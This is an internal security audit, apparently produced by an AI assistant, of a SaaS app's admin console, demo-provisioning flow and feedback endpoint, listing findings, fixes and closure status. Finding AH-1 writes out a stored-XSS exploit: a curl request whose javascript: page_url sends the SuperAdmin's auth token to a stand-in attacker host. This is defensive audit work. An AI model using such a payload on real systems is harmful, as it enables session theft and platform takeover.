# Smarterlift — Admin / Demo / Feedback Surface Review

_Generated 2026-04-29 from a deep read of the new SuperAdmin console (commits `694615a`, `dcef427`, `01ac1dd`, `e032395`), the public `/demo` flow + tenant provisioning, and the `/me/feedback` → `platform_feedback` path. Findings are file:line-grounded against `lambda/smartlift-api/index.mjs` and the React tree under `src/pages/admin/` + `src/components/admin/` + `src/components/common/`._

> **Bottom line (updated 2026-04-30).** All 1 HIGH and all 5 MEDIUM findings are CLOSED. AL-1 (slug 4-char suffix) closed as part of AM-3. Remaining LOWs (AL-2..AL-7) tracked in SESSION_TEMPLATE open-items list. Auth boundary remains sound (`getAuthContext` fail-closed, SuperAdmin check first, `/admin/*` 403 for any other role).
>
> Closure summary:
>  - **AH-1** stored XSS — closed `e199fd4` 2026-04-29 (server scheme-validation + client guard, both shipped + tested via Aurora Data API insert + AdminFeedback render check)
>  - **AM-1** rate-limit `/me/feedback` — closed `3b87a62` 2026-04-30 (10/h, 50/d per user_email; super_admin exempt)
>  - **AM-2** audit logging on `/admin/*` mutations — closed `3b87a62` 2026-04-30 (3 logActivity calls + activity_log.company_id made nullable; tenant_provisioned audit row verified live in AM-3 smoke test)
>  - **AM-3** tenant-provisioning hardening — closed `dbef773` + `814d695` 2026-04-30 (single-tx + advisory lock + AdminDeleteUser rollback + idempotent retry; full smoke test passed including idempotency proven by single audit row after two POSTs)
>  - **AM-4** email-confirm in ApproveModal — closed `d6bb61a` 2026-04-30 (double-entry field + live mismatch warning + submit gated)
>  - **AM-5** fail-closed `/demo-requests` rate-limit — closed `3b87a62` 2026-04-30 (catch returns 503, retry_after_seconds=30)
>  - **AL-1** slug 4-char → 8-char random suffix — closed `dbef773` 2026-04-30 (~2.8T combos)
>
> Side bug surfaced + fixed: `/team/users/invite` (`lambda/.../index.mjs:4429` originally) had the same `cognito_sub` NOT NULL violation pattern as AM-3 — silently shipped Cognito users with no `company_users` row, blocking sign-in via `getAuthContext`. Fixed `bc6e72e` 2026-04-30.

---

## Severity-ranked findings

### CRITICAL

_None._

### HIGH

#### AH-1. Stored XSS via `page_url` in `/me/feedback` → SuperAdmin session takeover

**Where:**
- `lambda/smartlift-api/index.mjs:3326` — `pageUrl = (body.page_url || '').slice(0, 500)`. No scheme check; the value is stored verbatim in `platform_feedback.page_url` at line 3329-3335.
- `src/pages/admin/AdminFeedback.jsx:244-247` — rendered as `<a href={selected.page_url} target="_blank" rel="noopener noreferrer">`. `rel="noopener noreferrer"` blocks tab-nabbing but does **not** block `javascript:` or `data:text/html` URI execution.

**Exploit chain:**
1. Any authenticated user (Owner/Sales/Tech/Staff/**Customer**) bypasses the FeedbackModal UI (which never sets `page_url`, see `src/components/common/FeedbackModal.jsx:49`) and crafts a direct API call:
   ```bash
   curl -X POST https://4cc23kla34.execute-api.us-east-1.amazonaws.com/prod/me/feedback \
     -H "Authorization: Bearer $MY_ID_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"subject":"check this","body":"x","page_url":"javascript:fetch(\"https://atk.example/?\"+encodeURIComponent(localStorage.smartlift_auth))"}'
   ```
2. The row lands in `platform_feedback` with the malicious URI.
3. SuperAdmin opens `/admin/feedback`, sees the entry in the active queue, clicks the page_url link to "see where they were."
4. JavaScript executes in `https://smarterlift.app` origin. `localStorage['smartlift_auth']` (which holds the SuperAdmin's idToken) is exfiltrated to `atk.example`.
5. Attacker calls `/admin/*` endpoints directly with the stolen idToken — including `POST /admin/demo-requests/:id/approve`, which provisions tenants via `AdminCreateUser`. Full platform takeover.

**Why this is HIGH:** customer-controlled input → cross-tenant privilege escalation to platform owner. The trust boundary that all CRITICAL/HIGH closures so far have been protecting (tenant ↔ platform) is fully bypassed.

**Fix (defense in depth, both layers):**

1. **Server-side scheme validation** in `lambda/smartlift-api/index.mjs:3326`:
   ```js
   const rawPageUrl = (body.page_url || '').slice(0, 500);
   const pageUrl = /^https?:\/\/[^\s<>"]+$/i.test(rawPageUrl) ? rawPageUrl : '';
   ```
2. **Client-side defense** in `src/pages/admin/AdminFeedback.jsx:244`:
   ```jsx
   {selected.page_url && /^https?:\/\//i.test(selected.page_url) && (
     <a href={selected.page_url} target="_blank" rel="noopener noreferrer" ...>
   )}
   ```
   Same shape as the fix recommended for `CM-3` in `CUSTOMER_PORTAL_REVIEW.md`.

**Bonus:** add a Content-Security-Policy header at the Amplify layer that blocks inline event handlers and `javascript:` navigations as a final safety net.

---

### MEDIUM

#### AM-1. No rate limit on `POST /me/feedback`

**Where:** `lambda/smartlift-api/index.mjs:3315-3374`. Any authenticated user can submit unlimited feedback rows. Each row fires a SES email to `nyceguy@thegoldensignature.com` (line 3360-3368).

**Risks:**
- SES sending quota exhaustion (default ~50k/day prod). A motivated user could DoS the founder's inbox or consume the daily SES allowance and break legitimate transactional email (welcome emails, demo confirmations, customer notifications).
- `platform_feedback` table bloat.
- Email-storm noise that buries real feedback.

**Fix:** mirror the CH-1 pattern (`lambda/smartlift-api/index.mjs` POST `/tickets` handler):
```js
const rl = await pool.query(
  `SELECT COUNT(*)::int AS n FROM platform_feedback
    WHERE user_email = $1 AND created_at > NOW() - INTERVAL '1 hour'`,
  [userEmail]
);
if ((rl.rows[0]?.n || 0) >= 10) {
  return respond(429, { error: 'rate_limited', message: 'You\'ve sent 10 feedback items in the last hour. Try again shortly.' });
}
```
Suggested limits: 10/hour and 50/day per `user_email`. Skip the rate-limit when `authRole === 'super_admin'` (founder testing).

#### AM-2. No audit logging on `/admin/*` mutations

**Where:** PATCH `/admin/feedback/:id` (`index.mjs:3544`), PATCH `/admin/demo-requests/:id` (`index.mjs:3674`), POST `/admin/demo-requests/:id/approve` (`index.mjs:3702`). None write to `activity_log`.

**Why this matters:** if a SuperAdmin idToken is ever stolen (see AH-1), there is no after-the-fact way to see what an attacker did. For tenant provisioning specifically, an attacker could create dozens of attacker-controlled tenants invisibly.

For comparison, customer-side mutations DO log to `activity_log` — see CH-1's `emergency_downgraded` writer.

**Fix:** wrap each mutation in a `logActivity` call. The most important one:
```js
// At the end of POST /admin/demo-requests/:id/approve (after line 3798):
await logActivity(pool, newCompanyId, decodeJWT(event)?.email || null,
  'tenant_provisioned', 'company', newCompanyId,
  { demo_request_id: drId, owner_email: ownerEmail, slug });
```

Good companion: add a "platform audit" view on the AdminActivity page that filters on a fixed action allowlist (`tenant_provisioned`, `tenant_status_changed`, `feedback_resolved`, etc.) and surfaces the actor email.

#### AM-3. Tenant provisioning is non-atomic; partial-failure modes leave orphan state

**Where:** `lambda/smartlift-api/index.mjs:3702-3849`. The provisioning sequence:

1. **INSERT companies** (line 3734)
2. **AdminCreateUser** in Cognito (line 3749)
3. **AdminAddUserToGroup CompanyUsers** (line 3761)
4. **AdminAddUserToGroup Owners** (line 3764)
5. **INSERT company_users** with `ON CONFLICT DO NOTHING` (line 3783-3789), non-fatal on error
6. **UPDATE demo_requests** to `status='approved'` (line 3792)
7. **SES welcome email** (line 3802), non-fatal

**Failure modes:**

| Failure point | Current behavior | Resulting state |
|---|---|---|
| Step 2 fails | Companies row deleted (3768-3769) | Clean rollback (good) |
| Step 3 or 4 fails (post-step-2) | Companies row deleted, but Cognito user is **not** deleted | Cognito user with no group, no DB row. Retry hits `UsernameExistsException` → 409. |
| Step 5 fails | Logged non-fatally (3789), flow continues | Cognito user fully provisioned but **no `company_users` row**. User can sign into Cognito but `getAuthContext` returns 401 (`user_not_provisioned`). Tenant created but unusable. |
| Step 6 fails | DB error → response is 500 | Tenant + Cognito user + company_users row exist; demo_request still status='new'. Retry would re-attempt provisioning → `UsernameExistsException` → 409. |
| Race (two simultaneous approves) | Both pass the `dr.status === 'approved'` check at line 3710 | Second attempt creates an extra companies row, fails on step 2 (`UsernameExistsException`), rolls back. Wasteful but not exploitable. |

**Fix:**

1. Wrap steps 1, 5, 6 in a Postgres transaction (`BEGIN…COMMIT/ROLLBACK`).
2. On Cognito group-attach failure (step 3/4), explicitly `AdminDeleteUser` before rolling back the companies row.
3. Add an advisory lock at the top of the handler to serialize concurrent approvals:
   ```sql
   SELECT pg_advisory_xact_lock(hashtext('demo_approve:' || $1));
   ```
4. Bonus: idempotency. If the demo_request is already `approved`, return the existing tenant rather than 409 — that lets a retried Approve click succeed cleanly.

#### AM-4. `email_verified=true` is forced from the demo-request email

**Where:** `lambda/smartlift-api/index.mjs:3754` — `{ Name: 'email_verified', Value: 'true' }` on `AdminCreateUser`. The email comes from `body.owner_email || dr.email` (line 3724).

**Risk:** a typo in the demo-request email (e.g., `dereld@swcabs.com` instead of `derald@swcabs.com`) means Cognito sends the temp password to the wrong inbox, the wrong person becomes the Owner of a new tenant, and the verification step that would normally surface the typo is bypassed because we declared the email pre-verified.

The founder reviews the email in the ApproveModal (`src/pages/admin/AdminDemoRequests.jsx:402-409`), but the friction is low and the consequences are high.

**Fix options:**

1. **(Preferred)** Set `email_verified='false'` on AdminCreateUser. Cognito will require verification at first sign-in. One extra step for the tenant onboard but typo-resistant.
2. **(Cheaper)** Add a "confirm owner email" double-entry field in `ApproveModal`:
   ```jsx
   <input value={ownerEmailConfirm} ... />
   {ownerEmail !== ownerEmailConfirm && <span className="text-red-400">Emails don't match</span>}
   ```
3. **(Best)** Both. Defense in depth.

#### AM-5. Per-IP rate limit on `/demo-requests` fails open on DB error

**Where:** `lambda/smartlift-api/index.mjs:355-364`:
```js
if (ip) {
  try {
    const rl = await pool.query(
      `SELECT COUNT(*)::int AS n FROM demo_requests
        WHERE ip_address = $1 AND created_at > NOW() - INTERVAL '24 hours'`,
      [ip]
    );
    if ((rl.rows[0]?.n || 0) >= 5) {
      return respondTo(event, 429, { error: 'rate_limited', ... });
    }
  } catch (e) { /* fall open */ }   // ← here
}
```

**Risk:** if the rate-limit query fails (DB blip, Aurora pause, network glitch), the handler proceeds to INSERT. An attacker who can reproduce the failure window — or just gets lucky — bypasses the cap.

**Fix:** fail-closed with a 503:
```js
} catch (e) {
  console.error('[demo-requests] rate-limit check failed; refusing:', e.message);
  return respondTo(event, 503, { error: 'rate_check_unavailable', retry_after_seconds: 30 });
}
```
Brief unavailability is cheaper than a queue flood.

---

### LOW

- **AL-1 — `slug` collision possible at scale.** `index.mjs:3719-3721` uses a 4-char `Math.random()` suffix (~1.6M combos). On UNIQUE violation, INSERT fails and the user sees a 500. Fix: 8-char suffix or `nanoid`, plus retry-once on UNIQUE violation.

- **AL-2 — `demo_requests.ip_address` retained indefinitely.** PII per GDPR/CPRA in some jurisdictions. The rate-limit lookback only needs 24 hours. Add a scheduled task that NULLs `ip_address` rows older than 90 days.

- **AL-3 — SuperAdmin can hit tenant-scoped routes with `companyId = null`.** PrivateRoute deliberately allows SuperAdmin into any role-gated section "for QA" (`src/components/common/PrivateRoute.jsx:14-21`). Tenant-scoped Lambda handlers run with `companyId = null`, which means SQL `WHERE company_id = $1` matches no rows (silently empty). For INSERT handlers, `company_id = NULL` would create orphan rows (subject to NOT NULL constraints). Not a security issue but a footgun. Fix: bounce SuperAdmin to `/admin/dashboard` from `/internal/*` and `/customer/*` in PrivateRoute, or have non-/admin handlers return 403 for `super_admin`.

- **AL-4 — `userEmail` in `/me/feedback` decoded separately from `getAuthContext`.** `index.mjs:3325` re-decodes the JWT to pull `email`. Since the auth context already has it (line 172), exposing email on the returned `getAuthContext` result and consuming it here would remove duplication. Cosmetic.

- **AL-5 — Schema bootstrap via inline DDL on cold start.** `ensureDemoRequestsSchema` at `index.mjs:259-288` is `CREATE IF NOT EXISTS`. Pragmatic but wouldn't survive a real migration tool review. The `platform_feedback` table doesn't have an equivalent bootstrap — was it created out-of-band? Verify it exists in Aurora. If yes, fold both into a real `db/migrations/` pattern when the next schema change comes through.

- **AL-6 — SES Subject header on `/me/feedback` doesn't strip newlines.** `index.mjs:3365`: `Subject: { Data: '[Smarterlift ${type}] ${subject.slice(0, 100)}' }`. AWS SDK typically rejects header-injection newlines, but `subject.replace(/[\r\n]/g, ' ')` before the slice is a one-token defense.

- **AL-7 — Honeypot bypass means rate-limit doesn't see savvy bots.** `index.mjs:327-329` returns 200 BEFORE the IP-based rate-limit check. A bot that detects the honeypot and skips it still gets the 5/day cap. A bot that fills the honeypot is silent-dropped (good) but doesn't count against any rate-limit. Net: tradeoff is acceptable; flagging for visibility, not a fix.

---

## Surface map (for follow-up sessions)

| Endpoint | Method | Auth | Function | Risk surface |
|---|---|---|---|---|
| `/demo-requests` | POST | none | Public demo-request intake | Honeypot, rate-limit, length caps, IP capture, SES email |
| `/me/feedback` | POST | any auth | Platform feedback inbox | Stored XSS via page_url (AH-1), rate-limit gap (AM-1), SES Subject injection (AL-6) |
| `/admin/dashboard` | GET | super_admin | KPI + sparklines + tenant brief | Read-only |
| `/admin/tenants` | GET | super_admin | Per-company stats | Read-only |
| `/admin/activity` | GET | super_admin | Cross-tenant activity_log | Read-only |
| `/admin/feedback` | GET | super_admin | Cross-tenant feedback queue | Render path (AdminFeedback.jsx) is XSS sink for AH-1 |
| `/admin/feedback/:id` | PATCH | super_admin | Update status/priority/notes | Missing audit log (AM-2) |
| `/admin/service-requests` | GET | super_admin | Cross-tenant tickets | Read-only |
| `/admin/demo-requests` | GET | super_admin | Demo queue | Read-only |
| `/admin/demo-requests/:id` | PATCH | super_admin | Status / notes | Missing audit log (AM-2) |
| `/admin/demo-requests/:id/approve` | POST | super_admin | **Tenant + Cognito provisioning** | Atomicity (AM-3), email-verified trust (AM-4), missing audit log (AM-2) |

---

## Recommended fix order (ROI)

| # | Item | Severity | Effort | Why this position |
|---|---|---|---|---|
| 1 | AH-1 page_url scheme validation | HIGH | 15 min (server) + 5 min (client) | Closes the only path to SuperAdmin XSS. Single-line change in two places. Ship first. |
| 2 | AM-2 audit logging on /admin/* mutations | MEDIUM | 25 min | If AH-1 is ever exploited again via a different vector, audit trail is the difference between recovery and unknowable damage. Ship before tenant 2. |
| 3 | AM-1 rate-limit /me/feedback | MEDIUM | 15 min | Mirrors the CH-1 emergency rate-limit pattern. Cheap, prevents quota exhaustion. |
| 4 | AM-5 fail-closed on /demo-requests rate-limit DB error | MEDIUM | 5 min | One catch-block change. Closes a small abuse window. |
| 5 | AM-4 email_verified handling in approve | MEDIUM | 30 min (option 2: confirm field) – 1 h (option 1: unverified by default + change downstream UX) | Real footgun for the founder, easy for the next demo cycle. |
| 6 | AM-3 transaction + advisory lock + Cognito rollback in approve | MEDIUM | 1-2 h | The provisioning path will run more often once outbound demos start. Worth tightening before the queue builds up. |
| 7 | AL-1..AL-7 polish | LOW | ~1 h total | After the above. |

Total to clear AH-1 + AM-1..AM-5: roughly half a day, no AWS state changes required (all in `lambda/smartlift-api/index.mjs` and one frontend file).

---

## Open questions

1. **Does `platform_feedback` exist in Aurora?** I see no `CREATE TABLE platform_feedback` in `lambda/smartlift-api/index.mjs` (`demo_requests` has its own `ensureDemoRequestsSchema` bootstrap; `platform_feedback` does not). Was the table created out-of-band by a script under `scripts/` (e.g., `scripts/apigw-add-feedback-and-tickets-routes.sh`)? If so, the column shape (`status`, `priority`, `admin_notes`, `resolved_at`, `user_role`, etc.) needs to be confirmed for `db/schema.md`.
2. **Is `email_verified=true` (AM-4) intentional product policy or a default-it-and-move-on shortcut?** Affects whether option 1 (require verification) is on the table.
3. **Should SuperAdmin be able to traverse `/internal/*` and `/customer/*` (AL-3)?** The PrivateRoute comment says "useful for QA" — confirming this is the intended product behavior. If yes, the silent-empty-result oddity stays; if no, tighten the guards.
4. **Which `pool.query` calls in `/admin/*` paths are concurrent-safe?** I only audited the demo-approve flow's atomicity. The other PATCH endpoints look like single-statement updates (idempotent), but worth a second pass before adding more SuperAdmins.

---

_End. To regenerate or extend, point me at any specific endpoint or page and I'll deepen the corresponding section. The audit boundary is clean enough that future findings will mostly be application-layer hygiene rather than auth-boundary holes._
